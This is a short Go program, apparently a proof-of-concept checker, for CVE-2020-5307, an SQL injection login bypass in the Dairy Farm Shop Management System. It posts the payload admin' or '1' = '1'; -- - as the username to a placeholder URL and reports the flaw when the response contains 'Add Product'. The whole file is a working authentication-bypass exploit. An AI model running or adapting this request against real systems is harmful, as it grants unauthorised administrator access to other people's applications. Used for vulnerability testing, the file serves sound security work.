// @Title  Dairy Farm Shop Management System SQL注入漏洞
// @Description  golang实现Dairy Farm Shop Management System SQL注入漏洞登录绕过
// @Author  lennon
// @Update  2021-01-06
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func main() {
	url := "http://your-ip/dfsms/index.php"
	method := "POST"
	payload := strings.NewReader(`username=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=a&login=`)
	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Cookie", "PHPSESSID=ogvk4oricas9oudnb7hb88kgjg")
	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	//fmt.Println(string(body))
	if strings.Contains(string(body), "Add Product") {
		fmt.Println("存在CVE-2020-5307漏洞")
	} else {
		fmt.Println("未检测到CVE-2020-5307漏洞")
	}
}
